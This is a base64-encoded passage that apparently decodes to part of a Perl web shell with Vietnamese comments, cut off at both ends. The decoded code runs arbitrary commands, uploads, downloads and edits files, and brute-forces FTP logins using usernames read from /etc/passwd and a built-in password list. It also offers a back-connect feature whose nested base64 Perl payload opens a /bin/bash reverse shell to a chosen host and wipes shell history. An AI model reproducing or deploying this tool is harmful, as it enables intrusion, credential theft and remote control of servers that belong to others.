lsZVVwbG9hZEZvcm07DQoNCgl9DQoJbXkgJHJlc3VsdD0iIjsNCgkjIHN0YXJ0IHRoZSB1cGxvYWRpbmcgcHJvY2Vzcw0KCSRyZXN1bHQgLj0gIlVwbG9hZGluZyAkVHJhbnNmZXJGaWxlIHRvICRDdXJyZW50RGlyLi4uPGJyPiI7DQoNCgkjIGdldCB0aGUgZnVsbGx5IHF1YWxpZmllZCBwYXRobmFtZSBvZiB0aGUgZmlsZSB0byBiZSBjcmVhdGVkDQoJY2hvcCgkVGFyZ2V0TmFtZSkgaWYgKCRUYXJnZXROYW1lID0gJEN1cnJlbnREaXIpID1+IG0vW1xcXC9dJC87DQoJJFRyYW5zZmVyRmlsZSA9fiBtIShbXi9eXFxdKikkITsNCgkkVGFyZ2V0TmFtZSAuPSAkUGF0aFNlcC4kMTsNCg0KCSRUYXJnZXRGaWxlU2l6ZSA9IGxlbmd0aCgkaW57J2ZpbGVkYXRhJ30pOw0KCSMgaWYgdGhlIGZpbGUgZXhpc3RzIGFuZCB3ZSBhcmUgbm90IHN1cHBvc2VkIHRvIG92ZXJ3cml0ZSBpdA0KCWlmKC1lICRUYXJnZXROYW1lICYmICRPcHRpb25zIG5lICJvdmVyd3JpdGUiKQ0KCXsNCgkJJHJlc3VsdCAuPSAiRmFpbGVkOiBEZXN0aW5hdGlvbiBmaWxlIGFscmVhZHkgZXhpc3RzLjxicj4iOw0KCX0NCgllbHNlICMgZmlsZSBpcyBub3QgcHJlc2VudA0KCXsNCgkJaWYob3BlbihVUExPQURGSUxFLCAiPiRUYXJnZXROYW1lIikpDQoJCXsNCgkJCWJpbm1vZGUoVVBMT0FERklMRSkgaWYgJFdpbk5UOw0KCQkJcHJpbnQgVVBMT0FERklMRSAkaW57J2ZpbGVkYXRhJ307DQoJCQljbG9zZShVUExPQURGSUxFKTsNCgkJCSRyZXN1bHQgLj0gIlRyYW5zZmVyZWQgJFRhcmdldEZpbGVTaXplIEJ5dGVzLjxicj4iOw0KCQkJJHJlc3VsdCAuPSAiRmlsZSBQYXRoOiAkVGFyZ2V0TmFtZTxicj4iOw0KCQl9DQoJCWVsc2UNCgkJew0KCQkJJHJlc3VsdCAuPSAiRmFpbGVkOiAkITxicj4iOw0KCQl9DQoJfQ0KCSRyZXN1bHQgLj0gJlByaW50Q29tbWFuZExpbmVJbnB1dEZvcm07DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgd2hlbiB0aGUgdXNlciB3YW50cyB0byBkb3dubG9hZCBhIGZpbGUuIElmIHRoZQ0KIyBmaWxlbmFtZSBpcyBub3Qgc3BlY2lmaWVkLCBpdCBkaXNwbGF5cyBhIGZvcm0gYWxsb3dpbmcgdGhlIHVzZXIgdG8gc3BlY2lmeSBhDQojIGZpbGUsIG90aGVyd2lzZSBpdCBkaXNwbGF5cyBhIG1lc3NhZ2UgdG8gdGhlIHVzZXIgYW5kIHByb3ZpZGVzIGEgbGluaw0KIyB0aHJvdWdoICB3aGljaCB0aGUgZmlsZSBjYW4gYmUgZG93bmxvYWRlZC4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBEb3dubG9hZEZpbGUNCnsNCgkjIGlmIG5vIGZpbGUgaXMgc3BlY2lmaWVkLCBwcmludCB0aGUgZG93bmxvYWQgZm9ybSBhZ2Fpbg0KCWlmKCRUcmFuc2ZlckZpbGUgZXEgIiIpDQoJew0KCQkmUHJpbnRQYWdlSGVhZGVyKCJmIik7DQoJCXJldHVybiAmUHJpbnRGaWxlRG93bmxvYWRGb3JtOw0KCX0NCgkNCgkjIGdldCBmdWxseSBxdWFsaWZpZWQgcGF0aCBvZiB0aGUgZmlsZSB0byBiZSBkb3dubG9hZGVkDQoJaWYoKCRXaW5OVCAmICgkVHJhbnNmZXJGaWxlID1+IG0vXlxcfF4uOi8pKSB8ICghJFdpbk5UICYgKCRUcmFuc2ZlckZpbGUgPX4gbS9eXC8vKSkpICMgcGF0aCBpcyBhYnNvbHV0ZQ0KCXsNCgkJJFRhcmdldEZpbGUgPSAkVHJhbnNmZXJGaWxlOw0KCX0NCgllbHNlICMgcGF0aCBpcyByZWxhdGl2ZQ0KCXsNCgkJY2hvcCgkVGFyZ2V0RmlsZSkgaWYoJFRhcmdldEZpbGUgPSAkQ3VycmVudERpcikgPX4gbS9bXFxcL10kLzsNCgkJJFRhcmdldEZpbGUgLj0gJFBhdGhTZXAuJFRyYW5zZmVyRmlsZTsNCgl9DQoNCglpZigkT3B0aW9ucyBlcSAiZ28iKSAjIHdlIGhhdmUgdG8gc2VuZCB0aGUgZmlsZQ0KCXsNCgkJcmV0dXJuICZTZW5kRmlsZVRvQnJvd3NlcigkVGFyZ2V0RmlsZSk7DQoJfQ0KCWVsc2UgIyB3ZSBoYXZlIHRvIHNlbmQgb25seSB0aGUgbGluayBwYWdlDQoJew0KCQlyZXR1cm4gJlByaW50RG93bmxvYWRMaW5rUGFnZSgkVGFyZ2V0RmlsZSk7DQoJfQ0KfQ0KDQoNCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgVGhpcyBmdW5jdGlvbiBpcyBjYWxsZWQgdG8gZXhlY3V0ZSBjb21tYW5kcy4gSXQgZGlzcGxheXMgdGhlIG91dHB1dCBvZiB0aGUNCiMgY29tbWFuZCBhbmQgYWxsb3dzIHRoZSB1c2VyIHRvIGVudGVyIGFub3RoZXIgY29tbWFuZC4gVGhlIGNoYW5nZSBkaXJlY3RvcnkNCiMgY29tbWFuZCBpcyBoYW5kbGVkIGRpZmZlcmVudGx5LiBJbiB0aGlzIGNhc2UsIHRoZSBuZXcgZGlyZWN0b3J5IGlzIHN0b3JlZCBpbg0KIyBhbiBpbnRlcm5hbCB2YXJpYWJsZSBhbmQgaXMgdXNlZCBlYWNoIHRpbWUgYSBjb21tYW5kIGhhcyB0byBiZSBleGVjdXRlZC4gVGhlDQojIG91dHB1dCBvZiB0aGUgY2hhbmdlIGRpcmVjdG9yeSBjb21tYW5kIGlzIG5vdCBkaXNwbGF5ZWQgdG8gdGhlIHVzZXJzDQojIHRoZXJlZm9yZSBlcnJvciBtZXNzYWdlcyBjYW5ub3QgYmUgZGlzcGxheWVkLg0KIy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQ0Kc3ViIEV4ZWN1dGVDb21tYW5kDQp7DQoJbXkgJHJlc3VsdD0iIjsNCglpZigkUnVuQ29tbWFuZCA9fiBtL15ccypjZFxzKyguKykvKSAjIGl0IGlzIGEgY2hhbmdlIGRpciBjb21tYW5kDQoJew0KCQkjIHdlIGNoYW5nZSB0aGUgZGlyZWN0b3J5IGludGVybmFsbHkuIFRoZSBvdXRwdXQgb2YgdGhlDQoJCSMgY29tbWFuZCBpcyBub3QgZGlzcGxheWVkLg0KCQkkQ29tbWFuZCA9ICJjZCBcIiRDdXJyZW50RGlyXCIiLiRDbWRTZXAuImNkICQxIi4kQ21kU2VwLiRDbWRQd2Q7DQoJCWNob3AoJEN1cnJlbnREaXIgPSBgJENvbW1hbmRgKTsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCg0KCQkkcmVzdWx0IC49ICJDb21tYW5kOiA8cnVuPiRSdW5Db21tYW5kIDwvcnVuPjxicj48dGV4dGFyZWEgY29scz0nJGNvbHMnIHJvd3M9JyRyb3dzJyBzcGVsbGNoZWNrPSdmYWxzZSc+IjsNCgkJIyB4dWF0IHRob25nIHRpbiBraGkgY2h1eWVuIGRlbiAxIHRodSBtdWMgbmFvIGRvIQ0KCQkkUnVuQ29tbWFuZD0gJFdpbk5UPyJkaXIiOiJkaXIgLWxpYSI7DQoJCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgl9ZWxzaWYoJFJ1bkNvbW1hbmQgPX4gbS9eXHMqZWRpdFxzKyguKykvKQ0KCXsNCgkJJHJlc3VsdCAuPSAgJlNhdmVGaWxlRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJJHJlc3VsdCAuPSAmUHJpbnRDb21tYW5kTGluZUlucHV0Rm9ybTsNCgkJJHJlc3VsdCAuPSAiQ29tbWFuZDogPHJ1bj4kUnVuQ29tbWFuZDwvcnVuPjxicj48dGV4dGFyZWEgaWQ9J2RhdGEnIGNvbHM9JyRjb2xzJyByb3dzPSckcm93cycgc3BlbGxjaGVjaz0nZmFsc2UnPiI7DQoJCSRyZXN1bHQgLj0mUnVuQ21kOw0KCX0NCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCXJldHVybiAkcmVzdWx0Ow0KfQ0KDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIHJ1biBjb21tYW5kDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQoNCnN1YiBSdW5DbWQNCnsNCglteSAkcmVzdWx0PSIiOw0KCSRDb21tYW5kID0gImNkIFwiJEN1cnJlbnREaXJcIiIuJENtZFNlcC4kUnVuQ29tbWFuZC4kUmVkaXJlY3RvcjsNCglpZighJFdpbk5UKQ0KCXsNCgkJJFNJR3snQUxSTSd9ID0gXCZDb21tYW5kVGltZW91dDsNCgkJYWxhcm0oJENvbW1hbmRUaW1lb3V0RHVyYXRpb24pOw0KCX0NCglpZigkU2hvd0R5bmFtaWNPdXRwdXQpICMgc2hvdyBvdXRwdXQgYXMgaXQgaXMgZ2VuZXJhdGVkDQoJew0KCQkkfD0xOw0KCQkkQ29tbWFuZCAuPSAiIHwiOw0KCQlvcGVuKENvbW1hbmRPdXRwdXQsICRDb21tYW5kKTsNCgkJd2hpbGUoPENvbW1hbmRPdXRwdXQ+KQ0KCQl7DQoJCQkkXyA9fiBzLyhcbnxcclxuKSQvLzsNCgkJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoIiRfXG4iKTsNCgkJfQ0KCQkkfD0wOw0KCX0NCgllbHNlICMgc2hvdyBvdXRwdXQgYWZ0ZXIgY29tbWFuZCBjb21wbGV0ZXMNCgl7DQoJCSRyZXN1bHQgLj0gJkh0bWxTcGVjaWFsQ2hhcnMoJyRDb21tYW5kJyk7DQoJfQ0KCWlmKCEkV2luTlQpDQoJew0KCQlhbGFybSgwKTsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQojIEZvcm0gU2F2ZSBGaWxlIA0KIz09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQ0Kc3ViIFNhdmVGaWxlRm9ybQ0Kew0KCW15ICRyZXN1bHQgPSIiOw0KCXN1YnN0cigkUnVuQ29tbWFuZCwwLDUpPSIiOw0KCW15ICRmaWxlPSZ0cmltKCRSdW5Db21tYW5kKTsNCgkkc2F2ZT0nPGJyPjxpbnB1dCBuYW1lPSJhIiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJzYXZlIiBjbGFzcz0ic3VibWl0IiA+JzsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kUnVuQ29tbWFuZDsNCglteSAkZGlyPSI8c3BhbiBzdHlsZT0nZm9udDogMTFwdCBWZXJkYW5hOyBmb250LXdlaWdodDogYm9sZDsnPiIuJkFkZExpbmtEaXIoImd1aSIpLiI8L3NwYW4+IjsNCglpZigtdyAkRmlsZSkNCgl7DQoJCSRyb3dzPSIyMyINCgl9ZWxzZQ0KCXsNCgkJJG1zZz0iPGJyPjxmb250IHN0eWxlPSdmb250OiAxNXB0IFZlcmRhbmE7IGNvbG9yOiB5ZWxsb3c7JyA+IFBlcm1pc3Npb24gZGVuaWVkITxmb250Pjxicj4iOw0KCQkkcm93cz0iMjAiDQoJfQ0KCSRQcm9tcHQgPSAkV2luTlQgPyAiJGRpciA+ICIgOiAiPGZvbnQgY29sb3I9JyNGRkZGRkYnPlthZG1pblxAJFNlcnZlck5hbWUgJGRpcl1cJDwvZm9udD4gIjsNCgkkcmVhZD0oJFdpbk5UKT8idHlwZSI6Imxlc3MiOw0KCSRSdW5Db21tYW5kID0gIiRyZWFkIFwiJFJ1bkNvbW1hbmRcIiI7DQoJJHJlc3VsdCAuPSAgPDxFTkQ7DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoNCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJkIiB2YWx1ZT0iJEN1cnJlbnREaXIiPg0KCSRQcm9tcHQNCgk8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iNDAiIG5hbWU9ImMiPg0KCTxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIHZhbHVlPSJFbnRlciI+DQoJPGJyPkNvbW1hbmQ6IDxydW4+ICRSdW5Db21tYW5kIDwvcnVuPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImZpbGUiIHZhbHVlPSIkZmlsZSIgPiAkc2F2ZSA8YnI+ICRtc2cNCgk8YnI+PHRleHRhcmVhIGlkPSJkYXRhIiBuYW1lPSJkYXRhIiBjb2xzPSIkY29scyIgcm93cz0iJHJvd3MiIHNwZWxsY2hlY2s9ImZhbHNlIj4NCkVORA0KCQ0KCSRyZXN1bHQgLj0gJlJ1bkNtZDsNCgkkcmVzdWx0IC49ICAiPC90ZXh0YXJlYT4iOw0KCSRyZXN1bHQgLj0gICI8L2Zvcm0+IjsNCglyZXR1cm4gJHJlc3VsdDsNCn0NCiM9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0NCiMgU2F2ZSBGaWxlDQojPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09DQpzdWIgU2F2ZUZpbGUoJCkNCnsNCglteSAkRGF0YT0gc2hpZnQgOw0KCW15ICRGaWxlPSBzaGlmdDsNCgkkRmlsZT0kQ3VycmVudERpci4kUGF0aFNlcC4kRmlsZTsNCglpZihvcGVuKEZJTEUsICI+JEZpbGUiKSkNCgl7DQoJCWJpbm1vZGUgRklMRTsNCgkJcHJpbnQgRklMRSAkRGF0YTsNCgkJY2xvc2UgRklMRTsNCgkJcmV0dXJuIDE7DQoJfWVsc2UNCgl7DQoJCXJldHVybiAwOw0KCX0NCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyIEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCcnV0ZUZvcmNlckZvcm0NCnsNCglteSAkcmVzdWx0PSIiOw0KCSRyZXN1bHQgLj0gPDxFTkQ7DQoNCjx0YWJsZT4NCg0KPHRyPg0KPHRkIGNvbHNwYW49IjIiIGFsaWduPSJjZW50ZXIiPg0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjPGJyPg0KU2ltcGxlIEZUUCBicnV0ZSBmb3JjZXI8YnI+DQojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMNCjxmb3JtIG5hbWU9ImYiIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KDQo8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYnJ1dGVmb3JjZXIiLz4NCjwvdGQ+DQo8L3RyPg0KPHRyPg0KPHRkPlVzZXI6PGJyPjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InVzZXIiPg0KRU5EDQpjaG9wKCRyZXN1bHQgLj0gYGxlc3MgL2V0Yy9wYXNzd2QgfCBjdXQgLWQ6IC1mMWApOw0KJHJlc3VsdCAuPSA8PCdFTkQnOw0KPC90ZXh0YXJlYT48L3RkPg0KPHRkPg0KDQpQYXNzOjxicj4NCjx0ZXh0YXJlYSByb3dzPSIxOCIgY29scz0iMzAiIG5hbWU9InBhc3MiPjEyM3Bhc3MNCjEyMyFAIw0KMTIzYWRtaW4NCjEyM2FiYw0KMTIzNDU2YWRtaW4NCjEyMzQ1NTQzMjENCjEyMzQ0MzIxDQpwYXNzMTIzDQphZG1pbg0KYWRtaW5jcA0KYWRtaW5pc3RyYXRvcg0KbWF0a2hhdQ0KcGFzc2FkbWluDQpwQHNzd29yZA0KcEBzc3cwcmQNCnBhc3N3b3JkDQoxMjM0NTYNCjEyMzQ1NjcNCjEyMzQ1Njc4DQoxMjM0NTY3ODkNCjEyMzQ1Njc4OTANCjExMTExMQ0KMDAwMDAwDQoyMjIyMjINCjMzMzMzMw0KNDQ0NDQ0DQo1NTU1NTUNCjY2NjY2Ng0KNzc3Nzc3DQo4ODg4ODgNCjk5OTk5OQ0KMTIzMTIzDQoyMzQyMzQNCjM0NTM0NQ0KNDU2NDU2DQo1Njc1NjcNCjY3ODY3OA0KNzg5Nzg5DQoxMjMzMjENCjQ1NjY1NA0KNjU0MzIxDQo3NjU0MzIxDQo4NzY1NDMyMQ0KOTg3NjU0MzIxDQowOTg3NjU0MzIxDQphZG1pbjEyMw0KYWRtaW4xMjM0NTYNCmFiY2RlZg0KYWJjYWJjDQohQCMhQCMNCiFAIyQlXg0KIUAjJCVeJiooDQohQCMkJCNAIQ0KYWJjMTIzDQphbmh5ZXVlbQ0KaWxvdmV5b3U8L3RleHRhcmVhPg0KPC90ZD4NCjwvdHI+DQo8dHI+DQo8dGQgY29sc3Bhbj0iMiIgYWxpZ249ImNlbnRlciI+DQpTbGVlcDo8c2VsZWN0IG5hbWU9InNsZWVwIj4NCg0KPG9wdGlvbj4wPC9vcHRpb24+DQo8b3B0aW9uPjE8L29wdGlvbj4NCjxvcHRpb24+Mjwvb3B0aW9uPg0KDQo8b3B0aW9uPjM8L29wdGlvbj4NCjwvc2VsZWN0PiANCjxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJzdWJtaXQiIHZhbHVlPSJCcnV0ZSBGb3JjZXIiLz48L3RkPjwvdHI+DQo8L2Zvcm0+DQo8L3RhYmxlPg0KRU5EDQpyZXR1cm4gJHJlc3VsdDsNCn0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCiMgQnJ1dGUgRm9yY2VyDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQnJ1dGVGb3JjZXINCnsNCglteSAkcmVzdWx0PSIiOw0KCSRTZXJ2ZXI9JEVOVnsnU0VSVkVSX0FERFInfTsNCglpZigkaW57J3VzZXInfSBlcSAiIikNCgl7DQoJCSRyZXN1bHQgLj0gJkJydXRlRm9yY2VyRm9ybTsNCgl9ZWxzZQ0KCXsNCgkJdXNlIE5ldDo6RlRQOyANCgkJQHVzZXI9IHNwbGl0KC9cbi8sICRpbnsndXNlcid9KTsNCgkJQHBhc3M9IHNwbGl0KC9cbi8sICRpbnsncGFzcyd9KTsNCgkJY2hvbXAoQHVzZXIpOw0KCQljaG9tcChAcGFzcyk7DQoJCSRyZXN1bHQgLj0gIjxicj48YnI+WytdIFRyeWluZyBicnV0ZSAkU2VydmVyTmFtZTxicj49PT09PT09PT09PT09PT09PT09PT4+Pj4+Pj4+Pj4+Pjw8PDw8PDw8PDw9PT09PT09PT09PT09PT09PT09PTxicj48YnI+XG4iOw0KCQlmb3JlYWNoICR1c2VybmFtZSAoQHVzZXIpDQoJCXsNCgkJCWlmKCEoJHVzZXJuYW1lIGVxICIiKSkNCgkJCXsNCgkJCQlmb3JlYWNoICRwYXNzd29yZCAoQHBhc3MpDQoJCQkJew0KCQkJCQkkZnRwID0gTmV0OjpGVFAtPm5ldygkU2VydmVyKSBvciBkaWUgIkNvdWxkIG5vdCBjb25uZWN0IHRvICRTZXJ2ZXJOYW1lXG4iOyANCgkJCQkJaWYoJGZ0cC0+bG9naW4oIiR1c2VybmFtZSIsIiRwYXNzd29yZCIpKQ0KCQkJCQl7DQoJCQkJCQkkcmVzdWx0IC49ICI8YSB0YXJnZXQ9J19ibGFuaycgaHJlZj0nZnRwOi8vJHVzZXJuYW1lOiRwYXNzd29yZFxAJFNlcnZlcic+WytdIGZ0cDovLyR1c2VybmFtZTokcGFzc3dvcmRcQCRTZXJ2ZXI8L2E+PGJyPlxuIjsNCgkJCQkJCSRmdHAtPnF1aXQoKTsNCgkJCQkJCWJyZWFrOw0KCQkJCQl9DQoJCQkJCWlmKCEoJGlueydzbGVlcCd9IGVxICIwIikpDQoJCQkJCXsNCgkJCQkJCXNsZWVwKGludCgkaW57J3NsZWVwJ30pKTsNCgkJCQkJfQ0KCQkJCQkkZnRwLT5xdWl0KCk7DQoJCQkJfQ0KCQkJfQ0KCQl9DQoJCSRyZXN1bHQgLj0gIlxuPGJyPj09PT09PT09PT0+Pj4+Pj4+Pj4+IEZpbmlzaGVkIDw8PDw8PDw8PDw9PT09PT09PT09PGJyPlxuIjsNCgl9DQoJcmV0dXJuICRyZXN1bHQ7DQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IEZvcm0NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBCYWNrQmluZEZvcm0NCnsNCglyZXR1cm4gPDxFTkQ7DQoJPGJyPjxicj4NCg0KCTx0YWJsZT4NCgk8dHI+DQoJPGZvcm0gbmFtZT0iZiIgbWV0aG9kPSJQT1NUIiBhY3Rpb249IiRTY3JpcHRMb2NhdGlvbiI+DQoJPHRkPkJhY2tDb25uZWN0OiA8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJhIiB2YWx1ZT0iYmFja2JpbmQiPjwvdGQ+DQoJPHRkPiBIb3N0OiA8aW5wdXQgdHlwZT0idGV4dCIgc2l6ZT0iMjAiIG5hbWU9ImNsaWVudGFkZHIiIHZhbHVlPSIkRU5WeydSRU1PVEVfQUREUid9Ij4NCgkgUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjciIG5hbWU9ImNsaWVudHBvcnQiIHZhbHVlPSI4MCIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JhJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij48L3RkPg0KDQoJPHRkPjxpbnB1dCBuYW1lPSJzIiBjbGFzcz0ic3VibWl0IiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCIgdmFsdWU9IkNvbm5lY3QiPjwvdGQ+DQoJPC9mb3JtPg0KCTwvdHI+DQoJPHRyPg0KCTx0ZCBjb2xzcGFuPTM+PGZvbnQgY29sb3I9I0ZGRkZGRj5bK10gQ2xpZW50IGxpc3RlbiBiZWZvcmUgY29ubmVjdCBiYWNrIQ0KCTxicj5bK10gVHJ5IGNoZWNrIHlvdXIgUG9ydCB3aXRoIDxhIHRhcmdldD0iX2JsYW5rIiBocmVmPSJodHRwOi8vd3d3LmNhbnlvdXNlZW1lLm9yZy8iPmh0dHA6Ly93d3cuY2FueW91c2VlbWUub3JnLzwvYT4NCgk8YnI+WytdIENsaWVudCBsaXN0ZW4gd2l0aCBjb21tYW5kOiA8cnVuPm5jIC12diAtbCAtcCA8c3BhbiBpZD0iYmEiPjgwPC9zcGFuPjwvcnVuPjwvZm9udD48L3RkPg0KDQoJPC90cj4NCgk8L3RhYmxlPg0KDQoJPGJyPjxicj4NCgk8dGFibGU+DQoJPHRyPg0KCTxmb3JtIG1ldGhvZD0iUE9TVCIgYWN0aW9uPSIkU2NyaXB0TG9jYXRpb24iPg0KCTx0ZD5CaW5kIFBvcnQ6IDxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImEiIHZhbHVlPSJiYWNrYmluZCI+PC90ZD4NCg0KCTx0ZD4gUG9ydDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJjbGllbnRwb3J0IiB2YWx1ZT0iMTQxMiIgb25rZXl1cD0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2JpJykuaW5uZXJIVE1MPXRoaXMudmFsdWU7Ij4NCg0KCSBQYXNzd29yZDogPGlucHV0IHR5cGU9InRleHQiIHNpemU9IjE1IiBuYW1lPSJiaW5kcGFzcyIgdmFsdWU9IlRISUVVR0lBQlVPTiI+PC90ZD4NCgk8dGQ+PGlucHV0IG5hbWU9InMiIGNsYXNzPSJzdWJtaXQiIHR5cGU9InN1Ym1pdCIgbmFtZT0ic3VibWl0IiB2YWx1ZT0iQmluZCI+PC90ZD4NCgk8L2Zvcm0+DQoJPC90cj4NCgk8dHI+DQoJPHRkIGNvbHNwYW49Mz48Zm9udCBjb2xvcj0jRkZGRkZGPlsrXSBDaHVjIG5hbmcgY2h1YSBkYyB0ZXN0IQ0KCTxicj5bK10gVHJ5IGNvbW1hbmQ6IDxydW4+bmMgJEVOVnsnU0VSVkVSX0FERFInfSA8c3BhbiBpZD0iYmkiPjE0MTI8L3NwYW4+PC9ydW4+PC9mb250PjwvdGQ+DQoNCgk8L3RyPg0KCTwvdGFibGU+PGJyPg0KRU5EDQp9DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIEJhY2tjb25uZWN0IHVzZSBwZXJsDQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQpzdWIgQmFja0JpbmQNCnsNCgl1c2UgTUlNRTo6QmFzZTY0Ow0KCXVzZSBTb2NrZXQ7CQ0KCSRiYWNrcGVybD0iSXlFdmRYTnlMMkpwYmk5d1pYSnNEUXAxYzJVZ1NVODZPbE52WTJ0bGREc05DaVJUYUdWc2JBazlJQ0l2WW1sdUwySmhjMmdpT3cwS0pFRlNSME05UUVGU1IxWTdEUXAxYzJVZ1UyOWphMlYwT3cwS2RYTmxJRVpwYkdWSVlXNWtiR1U3RFFwemIyTnJaWFFvVTA5RFMwVlVMQ0JRUmw5SlRrVlVMQ0JUVDBOTFgxTlVVa1ZCVFN3Z1oyVjBjSEp2ZEc5aWVXNWhiV1VvSW5SamNDSXBLU0J2Y2lCa2FXVWdjSEpwYm5RZ0lsc3RYU0JWYm1GaWJHVWdkRzhnVW1WemIyeDJaU0JJYjNOMFhHNGlPdzBLWTI5dWJtVmpkQ2hUVDBOTFJWUXNJSE52WTJ0aFpHUnlYMmx1S0NSQlVrZFdXekZkTENCcGJtVjBYMkYwYjI0b0pFRlNSMVpiTUYwcEtTa2diM0lnWkdsbElIQnlhVzUwSUNKYkxWMGdWVzVoWW14bElIUnZJRU52Ym01bFkzUWdTRzl6ZEZ4dUlqc05DbkJ5YVc1MElDSkRiMjV1WldOMFpXUWhJanNOQ2xOUFEwdEZWQzArWVhWMGIyWnNkWE5vS0NrN0RRcHZjR1Z1S0ZOVVJFbE9MQ0FpUGlaVFQwTkxSVlFpS1RzTkNtOXdaVzRvVTFSRVQxVlVMQ0krSmxOUFEwdEZWQ0lwT3cwS2IzQmxiaWhUVkVSRlVsSXNJajRtVTA5RFMwVlVJaWs3RFFwd2NtbHVkQ0FpTFMwOVBTQkRiMjV1WldOMFpXUWdRbUZqYTJSdmIzSWdQVDB0TFNBZ1hHNWNiaUk3RFFwemVYTjBaVzBvSW5WdWMyVjBJRWhKVTFSR1NVeEZPeUIxYm5ObGRDQlRRVlpGU0VsVFZDQTdaV05vYnlBb